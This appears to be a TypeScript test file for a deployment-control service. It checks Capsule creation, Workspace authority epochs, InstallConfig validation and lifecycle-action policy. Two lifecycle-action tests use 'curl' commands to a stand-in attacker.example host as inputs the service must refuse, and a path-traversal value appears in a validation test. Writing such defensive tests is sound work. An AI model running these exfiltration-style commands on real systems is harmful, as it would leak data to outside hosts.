import { expect, test } from "bun:test";

import { CapsulesService } from "../../../../core/domains/capsules/mod.ts";
import type { CreateCapsuleInitialAuthorityRequest } from "../../../../core/domains/capsules/mod.ts";
import { stableJsonDigest } from "../../../../core/adapters/source/digest.ts";
import {
  InMemoryOpenTofuControlStore,
  WorkspaceManagementAdmissionConflictError,
} from "../../../../core/domains/deploy-control/store.ts";
import { WorkspacesService } from "../../../../core/domains/workspaces/mod.ts";
import type {
  OpenTofuControlStore,
  StoredSource,
  WorkspaceManagementAuthority,
} from "../../../../core/domains/deploy-control/store.ts";
import { ProjectsService } from "../../../../core/domains/projects/mod.ts";
import {
  CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  INSTALL_CONFIG_PATCH_V1_KIND,
  type InstallConfig,
} from "takosumi-contract/install-configs";
import type { Workspace } from "takosumi-contract/workspaces";
import { withHistoricalPublicHostReservations } from "../../../helpers/deploy-control/historical_public_host_store.ts";
import { transitionProviderBindingSetForFixture } from "../../../helpers/deploy-control/model_fixture.ts";

const NOW = "2026-06-06T00:00:00.000Z";

function build(
  store: OpenTofuControlStore = new InMemoryOpenTofuControlStore(),
) {
  let counter = 0;
  const newId = (prefix: string) =>
    `${prefix}_test${(counter += 1).toString().padStart(8, "0")}`;
  const service = new CapsulesService({
    store,
    newId,
    now: () => new Date(NOW),
  });
  return { store, service };
}

async function seedWorkspace(
  store: OpenTofuControlStore,
  over: Partial<Workspace> = {},
): Promise<Workspace> {
  const workspace: Workspace = {
    id: "ws_1",
    handle: "shota",
    displayName: "Shota",
    type: "personal",
    ownerUserId: "user_1",
    createdAt: NOW,
    updatedAt: NOW,
    ...over,
  };
  await store.putWorkspace(workspace);
  return workspace;
}

async function seedSource(
  store: OpenTofuControlStore,
  over: Partial<StoredSource> = {},
): Promise<StoredSource> {
  const source: StoredSource = {
    id: "src_1",
    workspaceId: "ws_1",
    name: "repo",
    url: "https://example.com/acme/repo.git",
    defaultRef: "release",
    defaultPath: "infra",
    status: "active",
    createdAt: NOW,
    updatedAt: NOW,
    hookSecretHash: "hash",
    autoSync: false,
    ...over,
  };
  await store.putSource(source);
  return source;
}

async function seedConfig(
  store: OpenTofuControlStore,
  over: Partial<InstallConfig> = {},
): Promise<InstallConfig> {
  const config: InstallConfig = {
    id: "cfg_1",
    name: "config",
    variableMapping: {},
    outputAllowlist: {},
    policy: {},
    createdAt: NOW,
    updatedAt: NOW,
    ...over,
  };
  await store.putInstallConfig(config);
  return config;
}

async function seedWorkspaceAndSource(store: OpenTofuControlStore): Promise<void> {
  await seedWorkspace(store);
  await seedSource(store);
}

function initialInstallConfig(
  id: string,
  over: Partial<InstallConfig> = {},
): InstallConfig {
  return {
    id,
    workspaceId: "ws_1",
    name: id,
    variableMapping: {},
    outputAllowlist: {},
    policy: {},
    createdAt: NOW,
    updatedAt: NOW,
    ...over,
  };
}

test("successor config preparation retains Workspace authority and stopped replay is read-only", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  const workspaces = new WorkspacesService({ store });
  const captured = await workspaces.captureManagementAuthority("ws_1");
  expect(captured).toEqual({
    workspaceId: "ws_1", managementState: "active", managementEpoch: 1,
  });
  const existing = initialInstallConfig("config_successor_existing");
  expect(await service.createInstallConfigIfAbsent(existing, captured)).toBe(true);
  await store.beginWorkspaceDraining("ws_1", captured);
  await expect(workspaces.captureManagementAuthority("ws_1")).rejects.toBeInstanceOf(
    WorkspaceManagementAdmissionConflictError,
  );
  await expect(workspaces.captureManagementAuthority("ws_missing")).rejects.toBeInstanceOf(
    WorkspaceManagementAdmissionConflictError,
  );
  const fresh = initialInstallConfig("config_successor_stopped");
  await expect(service.createInstallConfigIfAbsent(fresh, captured)).rejects.toBeInstanceOf(
    WorkspaceManagementAdmissionConflictError,
  );
  await expect(service.createInstallConfigIfAbsent(fresh)).rejects.toBeInstanceOf(
    WorkspaceManagementAdmissionConflictError,
  );
  expect(await store.getInstallConfig(fresh.id)).toBeUndefined();
  expect(await service.createInstallConfigIfAbsent(existing, captured)).toBe(false);
  expect(await service.createInstallConfigIfAbsent(existing)).toBe(false);
  expect(await store.getInstallConfig(existing.id)).toEqual(existing);
});

interface InitialCapsuleFixture
  extends Omit<
    CreateCapsuleInitialAuthorityRequest,
    | "workspaceId"
    | "name"
    | "environment"
    | "sourceId"
    | "installingPrincipalId"
    | "providerBindings"
  > {
  readonly workspaceId?: string;
  readonly name?: string;
  readonly environment?: string;
  readonly sourceId?: string;
  readonly installingPrincipalId?: string;
  readonly providerBindings?: CreateCapsuleInitialAuthorityRequest["providerBindings"];
}

async function createInitialCapsule(
  service: CapsulesService,
  fixture: InitialCapsuleFixture,
) {
  const response = await service.createCapsuleInitialAuthority({
    workspaceId: "ws_1",
    name: "shop",
    environment: "production",
    sourceId: "src_1",
    installingPrincipalId: "principal_installer",
    providerBindings: [],
    ...fixture,
  });
  return response.capsule;
}

class ReplayProjectProbe extends ProjectsService {
  ensureDefaultProjectCalls = 0;

  override async ensureDefaultProject(
    workspaceId: string,
    expectedWorkspaceManagementAuthority?: WorkspaceManagementAuthority,
  ) {
    this.ensureDefaultProjectCalls += 1;
    if (this.ensureDefaultProjectCalls > 1) {
      throw new Error("default Project creation must not run on replay");
    }
    return await super.ensureDefaultProject(
      workspaceId,
      expectedWorkspaceManagementAuthority,
    );
  }
}

test("initial authority rejects a supplied noncurrent Workspace epoch without creating resources", async () => {
  const store = new InMemoryOpenTofuControlStore();
  await seedWorkspace(store);
  await seedSource(store);
  const workspaces = new WorkspacesService({ store });
  const authority = await workspaces.captureManagementAuthority("ws_1");
  const projects = new ProjectsService({ store });
  await projects.ensureDefaultProject("ws_1", authority);
  let activityCalls = 0;
  const service = new CapsulesService({
    store,
    projects,
    now: () => new Date(NOW),
    activity: {
      record: async () => undefined,
      recordIdempotent: async () => {
        activityCalls += 1;
        return undefined;
      },
    },
  });
  const request = {
    capsuleId: "cap_stale_new",
    providerBindingSetId: "pbind_stale_new",
    workspaceId: "ws_1",
    name: "stale-new",
    environment: "production",
    sourceId: "src_1",
    installingPrincipalId: "principal_installer",
    expectedWorkspaceManagementAuthority: {
      ...authority,
      managementEpoch: authority.managementEpoch + 1,
    },
    installConfig: initialInstallConfig("cfg_stale_new"),
    providerBindings: [],
  } satisfies CreateCapsuleInitialAuthorityRequest;

  await expect(service.createCapsuleInitialAuthority(request)).rejects.toMatchObject({
    code: "failed_precondition",
    details: { reason: "workspace_management_admission_conflict" },
  });
  expect(await store.getCapsule(request.capsuleId)).toBeUndefined();
  expect(await store.getInstallConfig(request.installConfig.id)).toBeUndefined();
  expect(
    await store.getProviderBindingSetByCapsule(
      request.capsuleId,
      request.environment,
    ),
  ).toBeUndefined();
  expect(activityCalls).toBe(0);
});

test("initial authority replay during Workspace drain is observation-only", async () => {
  const store = new InMemoryOpenTofuControlStore();
  await seedWorkspace(store);
  await seedSource(store);
  const projects = new ReplayProjectProbe({ store });
  const authority = await new WorkspacesService({ store }).captureManagementAuthority(
    "ws_1",
  );
  let idempotentActivityCalls = 0;
  const service = new CapsulesService({
    store,
    projects,
    activity: {
      record: async () => undefined,
      recordIdempotent: async () => {
        idempotentActivityCalls += 1;
        return undefined;
      },
    },
  });
  const request = {
    capsuleId: "cap_initial",
    providerBindingSetId: "pbind_initial",
    workspaceId: "ws_1",
    name: "initial",
    environment: "production",
    sourceId: "src_1",
    installingPrincipalId: "principal_installer",
    expectedWorkspaceManagementAuthority: authority,
    installConfig: {
      id: "cfg_initial",
      workspaceId: "ws_1",
      name: "initial",
      variableMapping: {},
      outputAllowlist: {},
      policy: {},
      createdAt: NOW,
      updatedAt: NOW,
    },
    providerBindings: [],
  } as const;

  const created = await service.createCapsuleInitialAuthority(request);
  expect(created.replayed).toBe(false);
  expect(projects.ensureDefaultProjectCalls).toBe(1);
  expect(idempotentActivityCalls).toBe(1);

  expect(
    await store.beginWorkspaceDraining("ws_1", authority),
  ).toMatchObject({ status: "started" });

  const replay = await service.createCapsuleInitialAuthority(request);
  expect(replay).toEqual({ capsule: created.capsule, replayed: true });
  expect(projects.ensureDefaultProjectCalls).toBe(1);
  expect(idempotentActivityCalls).toBe(1);
});

test("createCapsuleInitialAuthority persists the canonical Workspace, Project, and Capsule fields", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_fields",
    providerBindingSetId: "pbind_fields",
    installConfig: initialInstallConfig("cfg_fields"),
  });

  expect(capsule.id).toBe("cap_fields");
  expect(capsule.workspaceId).toBe("ws_1");
  expect(capsule.projectId).toStartWith("prj_");
  expect(capsule.slug).toBe("shop");
  expect(capsule.currentStateGeneration).toBe(0);
  expect(capsule.status).toBe("pending");
  expect(capsule.createdAt).toBe(NOW);
  expect((await store.getCapsule(capsule.id))?.name).toBe("shop");
});

test("createCapsuleInitialAuthority rejects an invalid name", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_invalid_name",
      providerBindingSetId: "pbind_invalid_name",
      installConfig: initialInstallConfig("cfg_invalid_name"),
      name: "Shop Name",
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsuleInitialAuthority rejects an unknown Workspace", async () => {
  const { store, service } = build();
  await seedSource(store);
  await expect(
    createInitialCapsule(service, {
      workspaceId: "ws_missing",
      capsuleId: "cap_unknown_workspace",
      providerBindingSetId: "pbind_unknown_workspace",
      installConfig: initialInstallConfig("cfg_unknown_workspace", {
        workspaceId: "ws_missing",
      }),
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsuleInitialAuthority rejects a Source owned by another Workspace", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store, { id: "src_other", workspaceId: "ws_other" });
  await expect(
    createInitialCapsule(service, {
      sourceId: "src_other",
      capsuleId: "cap_foreign_source",
      providerBindingSetId: "pbind_foreign_source",
      installConfig: initialInstallConfig("cfg_foreign_source"),
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsuleInitialAuthority rejects timestamps from different config transitions", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_invalid_config",
      providerBindingSetId: "pbind_invalid_config",
      installConfig: initialInstallConfig("cfg_invalid_config", {
        updatedAt: "2026-06-06T00:00:01.000Z",
      }),
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsuleInitialAuthority enforces Workspace ownership for InstallConfig", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_foreign_config",
      providerBindingSetId: "pbind_foreign_config",
      installConfig: initialInstallConfig("cfg_foreign_config", {
        workspaceId: "ws_other",
      }),
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });

  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_workspace_config",
    providerBindingSetId: "pbind_workspace_config",
    installConfig: initialInstallConfig("cfg_workspace_config"),
  });
  expect(capsule.installConfigId).toBe("cfg_workspace_config");
});

test("createCapsuleInitialAuthority enforces the InstallConfig Source coordinate at the authority boundary", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);
  const sourceSelector = {
    url: "https://example.com/acme/repo",
    path: "./infra/",
  } as const;
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_coordinate",
    providerBindingSetId: "pbind_coordinate",
    installConfig: initialInstallConfig("cfg_coordinate", {
      sourceSelector,
    }),
  });
  expect(capsule.sourceId).toBe("src_1");

  await seedSource(store, {
    id: "src_other_repo",
    url: "https://example.com/acme/other.git",
  });
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_other_repo",
      providerBindingSetId: "pbind_other_repo",
      installConfig: initialInstallConfig("cfg_other_repo", {
        sourceSelector,
      }),
      name: "other-repo",
      sourceId: "src_other_repo",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });

  await seedSource(store, {
    id: "src_other_path",
    defaultPath: "other",
  });
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_other_path",
      providerBindingSetId: "pbind_other_path",
      installConfig: initialInstallConfig("cfg_other_path", {
        sourceSelector,
      }),
      name: "other-path",
      sourceId: "src_other_path",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });
  await seedSource(store, {
    id: "src_query",
    url: "https://example.com/acme/repo.git?alternate=1",
  });
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_query_source",
      providerBindingSetId: "pbind_query_source",
      installConfig: initialInstallConfig("cfg_query_source", {
        sourceSelector,
      }),
      name: "query-source",
      sourceId: "src_query",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });
  expect(
    await store.getCapsuleByName(capsule.projectId, "other-repo", "production"),
  ).toBeUndefined();
  expect(
    await store.getCapsuleByName(capsule.projectId, "other-path", "production"),
  ).toBeUndefined();
  expect(
    await store.getCapsuleByName(
      capsule.projectId,
      "query-source",
      "production",
    ),
  ).toBeUndefined();
});

test("createCapsuleInitialAuthority enforces unique Project, name, and environment", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await createInitialCapsule(service, {
    capsuleId: "cap_duplicate_first",
    providerBindingSetId: "pbind_duplicate_first",
    installConfig: initialInstallConfig("cfg_duplicate_first"),
  });
  await expect(
    createInitialCapsule(service, {
      capsuleId: "cap_duplicate_second",
      providerBindingSetId: "pbind_duplicate_second",
      installConfig: initialInstallConfig("cfg_duplicate_second"),
    }),
  ).rejects.toMatchObject({
    code: "failed_precondition",
  });
});

test("a destroyed Capsule does not reserve its former name", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  const destroyed = await createInitialCapsule(service, {
    capsuleId: "cap_destroyed",
    providerBindingSetId: "pbind_destroyed",
    installConfig: initialInstallConfig("cfg_destroyed"),
  });
  await store.putCapsule({ ...destroyed, status: "destroyed" });

  const replacement = await createInitialCapsule(service, {
    capsuleId: "cap_destroyed_replacement",
    providerBindingSetId: "pbind_destroyed_replacement",
    installConfig: initialInstallConfig("cfg_destroyed_replacement"),
  });
  expect(replacement.id).not.toBe(destroyed.id);
  expect(replacement.status).toBe("pending");
});

test("abandonUnappliedCapsule closes the ledger and bindings without mutating historical host reservations", async () => {
  const baseStore = new InMemoryOpenTofuControlStore();
  let releaseCalls = 0;
  const store = withHistoricalPublicHostReservations(
    baseStore,
    [
      {
        hostname: "shop.app.example",
        ownerUserId: "user_1",
        workspaceId: "ws_1",
        capsuleId: "cap_test00000001",
        capsuleName: "shop",
        allocationKind: "scoped",
        status: "reserved",
        reservedAt: NOW,
        updatedAt: NOW,
      },
    ],
    { onRelease: () => (releaseCalls += 1) },
  );
  const { service } = build(store);
  await seedWorkspaceAndSource(store);
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_test00000001",
    providerBindingSetId: "pbind_1",
    installConfig: initialInstallConfig("cfg_abandon"),
  });
  expect(capsule.id).toBe("cap_test00000001");
  await transitionProviderBindingSetForFixture(store, {
    id: "pbind_1",
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    environment: capsule.environment,
    bindings: [
      {
        provider: "registry.opentofu.org/examplecorp/example",
        alias: "main",
        connectionId: "conn_example",
      },
    ],
    createdAt: NOW,
    updatedAt: NOW,
  });

  const abandoned = await service.abandonUnappliedCapsule(
    capsule.id,
    "test abandon",
  );

  expect(abandoned.status).toBe("destroyed");
  expect((await store.getCapsule(capsule.id))?.status).toBe("destroyed");
  expect(
    (await store.getPublicHostReservation("shop.app.example"))?.status,
  ).toBe("reserved");
  expect(releaseCalls).toBe(0);
  expect(
    await service.getProviderBindingSetByCapsule(
      capsule.id,
      capsule.environment,
    ),
  ).toBeUndefined();
  expect(
    (
      await createInitialCapsule(service, {
        capsuleId: "cap_abandon_replacement",
        providerBindingSetId: "pbind_abandon_replacement",
        installConfig: initialInstallConfig("cfg_abandon_replacement"),
      })
    ).id,
  ).not.toBe(capsule.id);
});

test("abandonUnappliedCapsule refuses a Capsule with applied state", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_applied",
    providerBindingSetId: "pbind_applied",
    installConfig: initialInstallConfig("cfg_applied"),
  });
  await store.patchCapsule(capsule.id, {
    currentStateGeneration: 1,
    updatedAt: "2026-06-06T00:01:00.000Z",
  });

  await expect(
    service.abandonUnappliedCapsule(capsule.id, "test abandon"),
  ).rejects.toMatchObject({ code: "failed_precondition" });
});

test("the same Capsule name can be used in another environment", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await createInitialCapsule(service, {
    capsuleId: "cap_production",
    providerBindingSetId: "pbind_production",
    installConfig: initialInstallConfig("cfg_production"),
  });
  const preview = await createInitialCapsule(service, {
    capsuleId: "cap_preview",
    providerBindingSetId: "pbind_preview",
    installConfig: initialInstallConfig("cfg_preview"),
    environment: "preview",
  });
  expect(preview.environment).toBe("preview");
});

test("getCapsule, batched get, listCapsules, and patchCapsuleStatus use canonical ids", async () => {
  const { store, service } = build();
  await seedWorkspaceAndSource(store);
  await seedWorkspace(store, { id: "ws_2", handle: "other" });
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_lookup",
    providerBindingSetId: "pbind_lookup",
    installConfig: initialInstallConfig("cfg_lookup"),
  });

  expect((await service.getCapsule(capsule.id)).id).toBe(capsule.id);
  expect(
    (await service.getCapsulesByIds([capsule.id, "cap_missing"])).map(
      (row) => row.id,
    ),
  ).toEqual([capsule.id]);
  expect((await service.listCapsules("ws_1")).map((row) => row.id)).toEqual([
    capsule.id,
  ]);
  expect(await service.listCapsules("ws_2")).toEqual([]);
  expect((await service.patchCapsuleStatus(capsule.id, "active")).status).toBe(
    "active",
  );
  await expect(service.getCapsule("cap_missing")).rejects.toMatchObject({
    code: "not_found",
  });
});

test("putInstallConfig requires an existing owning Workspace", async () => {
  const { service } = build();
  await expect(
    service.putInstallConfig({
      id: "cfg_x",
      workspaceId: "ws_missing",
      name: "x",
      variableMapping: {},
      outputAllowlist: {},
      policy: {},
      createdAt: NOW,
      updatedAt: NOW,
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("putInstallConfig validates the operator-owned Source selector", async () => {
  const { service } = build();
  const base: InstallConfig = {
    id: "cfg_source_selector",
    name: "source-selector",
    variableMapping: {},
    outputAllowlist: {},
    policy: {},
    createdAt: NOW,
    updatedAt: NOW,
  };

  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: {
        url: "https://example.test/acme/repo.git",
        path: "../outside",
      },
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("sourceSelector.path"),
  });
  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: { url: "bad\u0000url", path: "." },
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("sourceSelector.url"),
  });
  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: {
        url: "https://example.test/Acme/Repo.git",
        path: ".",
      },
    }),
  ).resolves.toMatchObject({ id: base.id });
});

test("putInstallConfig accepts explicit lifecycle actions and rejects missing policy", async () => {
  const { service } = build();
  const action = {
    apiVersion: "takosumi.dev/v1alpha1" as const,
    kind: "command" as const,
    id: "publish",
    phase: "post_apply" as const,
    executor: "runner" as const,
    command: ["bun", "run", "publish"],
    runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  };
  const base = {
    id: "cfg_actions",
    name: "actions",
    variableMapping: {},
    outputAllowlist: {},
    lifecycleActions: [action],
    createdAt: NOW,
    updatedAt: NOW,
  };

  await expect(
    service.putInstallConfig({ ...base, policy: {} }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("policy.lifecycleActions"),
  });

  const config = await service.putInstallConfig({
    ...base,
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner"],
        allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
      },
    },
  });
  expect(config.lifecycleActions?.[0]?.id).toBe("publish");
});

test("a Workspace-owned InstallConfig cannot widen its own lifecycle action policy", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  // The per-install row inherits a runner-only grant from the shared config it
  // was cloned from. Widening it in the same write that installs the action
  // would be self-authorization: `validateLifecycleActions` only ever checks
  // the policy carried by that write.
  const stored = await seedConfig(store, {
    id: "icfg_scoped00000001",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner"],
        allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
      },
    },
  });

  await expect(
    service.putInstallConfig({
      ...stored,
      lifecycleActions: [
        {
          apiVersion: "takosumi.dev/v1alpha1",
          kind: "command",
          id: "activate",
          phase: "post_apply",
          executor: "operator",
          command: ["curl", "https://attacker.example/steal"],
          runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
        },
      ],
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
        },
      },
    }),
  ).rejects.toMatchObject({
    code: "permission_denied",
    message: expect.stringContaining("allowedExecutors"),
  });
});

test("a Workspace-owned InstallConfig cannot author a new operator lifecycle action", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  const inheritedAction = {
    apiVersion: "takosumi.dev/v1alpha1" as const,
    kind: "command" as const,
    id: "activate",
    phase: "post_apply" as const,
    executor: "operator" as const,
    command: ["bun", "scripts/control/takosumi-release.mjs", "production"],
    runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  };
  const policy = {
    lifecycleActions: {
      allowedExecutors: ["runner", "operator"] as const,
      allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
    },
  };
  const stored = await seedConfig(store, {
    id: "icfg_scoped00000002",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
    lifecycleActions: [inheritedAction],
    policy,
  });

  // The policy is unchanged and legitimately allows an operator executor, but
  // an operator action is run by the operator's release-activation webhook, so
  // the command itself may only be inherited verbatim.
  await expect(
    service.putInstallConfig({
      ...stored,
      lifecycleActions: [
        { ...inheritedAction, command: ["curl", "https://attacker.example"] },
      ],
    }),
  ).rejects.toMatchObject({ code: "permission_denied" });

  // Re-persisting the inherited action (and narrowing) stays allowed.
  const unchanged = await service.putInstallConfig(stored);
  expect(unchanged.lifecycleActions?.[0]?.id).toBe("activate");
});

test("only unattached Workspace-neutral InstallConfig templates accept patches", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);

  const compiled = initialInstallConfig("icfg_compiled", {
    internal: {
      reason: "per_install_overrides",
      sourceSnapshotId: "snap_compiled",
      repositoryInstallUxDigest: `sha256:${"a".repeat(64)}`,
    },
    variableMapping: { original: "compiled" },
  });
  const capsule = await createInitialCapsule(service, {
    capsuleId: "cap_compiled",
    providerBindingSetId: "pbind_compiled",
    installConfig: compiled,
  });
  const sealed = await seedConfig(store, {
    id: "icfg_re_adopted",
    workspaceId: "ws_1",
    internal: {
      reason: "per_install_overrides",
      sourceSnapshotId: "snap_re_adopted",
      repositoryInstallUxDigest: `sha256:${"b".repeat(64)}`,
      reAdoption: {
        capsuleId: capsule.id,
        actorSubject: "user_1",
        reason: "adopt reviewed repository setup",
        idempotencyKeyHash: `sha256:${"c".repeat(64)}`,
        requestDigest: `sha256:${"d".repeat(64)}`,
        previousInstallConfigId: "cfg_previous",
        previousInstallConfigDigest: `sha256:${"e".repeat(64)}`,
        previousCapsuleStatus: capsule.status,
        previousStateGeneration: capsule.currentStateGeneration,
        previousExecutionAuthorityEpoch: 1,
        authorityGuard: `sha256:${"f".repeat(64)}`,
        derivedTargetDigest: `sha256:${"1".repeat(64)}`,
        baseInstallConfigId: "cfg_base",
        sourceSnapshotId: "snap_re_adopted",
      },
    },
    variableMapping: { original: "re-adopted" },
  });

  let replacementCount = 0;
  const replaceUnreferencedSharedInstallConfig =
    store.replaceUnreferencedSharedInstallConfig.bind(store);
  store.replaceUnreferencedSharedInstallConfig = async (current, replacement) => {
    replacementCount += 1;
    return await replaceUnreferencedSharedInstallConfig(current, replacement);
  };
  const beforeCapsule = await service.getCapsule(capsule.id);
  const beforeEpoch = await service.getCapsuleExecutionAuthorityEpoch(
    capsule.id,
  );
  const patch = {
    kind: INSTALL_CONFIG_PATCH_V1_KIND,
    variableMapping: { changed: "must-not-persist" },
  };

  for (const row of [compiled, sealed]) {
    const before = await service.getInstallConfig(row.id);
    const beforeDigest = await stableJsonDigest(before);
    const beforeSeal = before.internal?.reAdoption?.derivedTargetDigest;
    await expect(service.applyInstallConfigPatch(row.id, patch)).rejects
      .toMatchObject({
        code: "failed_precondition",
        details: { reason: "install_config_in_use" },
        message: expect.stringContaining(
          "Only an unattached Workspace-neutral InstallConfig template may be patched",
        ),
      });
    expect(replacementCount).toBe(0);
    const after = await service.getInstallConfig(row.id);
    expect(after).toEqual(before);
    expect(await stableJsonDigest(after)).toBe(beforeDigest);
    expect(after.internal?.reAdoption?.derivedTargetDigest).toBe(beforeSeal);
  }

  expect(await service.getCapsule(capsule.id)).toEqual(beforeCapsule);
  expect(await service.getCapsuleExecutionAuthorityEpoch(capsule.id)).toBe(
    beforeEpoch,
  );

  const mutable = await seedConfig(store, {
    id: "icfg_mutable",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
  });
  replacementCount = 0;
  await expect(service.applyInstallConfigPatch(mutable.id, patch)).rejects
    .toMatchObject({
      code: "failed_precondition",
      details: { reason: "install_config_in_use" },
    });
  expect(await service.getInstallConfig(mutable.id)).toEqual(mutable);
  expect(replacementCount).toBe(0);

  const shared = await seedConfig(store, { id: "cfg_shared" });
  replacementCount = 0;
  const sharedResult = await service.applyInstallConfigPatch(shared.id, patch);
  expect(sharedResult.variableMapping).toEqual({ changed: "must-not-persist" });
  expect(replacementCount).toBe(1);
});

test("InstallConfig reads list only selectable service-side configuration", async () => {
  const { store, service } = build();
  await seedConfig(store);
  await seedConfig(store, {
    id: "icfg_0123456789abcdef",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
  });

  expect((await service.getInstallConfig("cfg_1")).name).toBe("config");
  expect((await service.listInstallConfigs()).map((row) => row.id)).toEqual([
    "cfg_1",
  ]);
  await expect(service.getInstallConfig("cfg_missing")).rejects.toMatchObject({
    code: "not_found",
  });
});
